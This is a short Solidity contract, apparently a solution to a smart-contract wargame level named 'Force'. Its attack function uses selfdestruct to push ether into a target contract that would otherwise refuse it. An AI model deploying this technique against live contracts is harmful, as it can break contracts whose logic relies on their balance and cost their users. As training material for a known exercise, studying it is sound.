// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IForce {
}

contract ForceAttack {

    constructor() payable {}

    function attack(address payable target) public {
        selfdestruct(target);
    }
}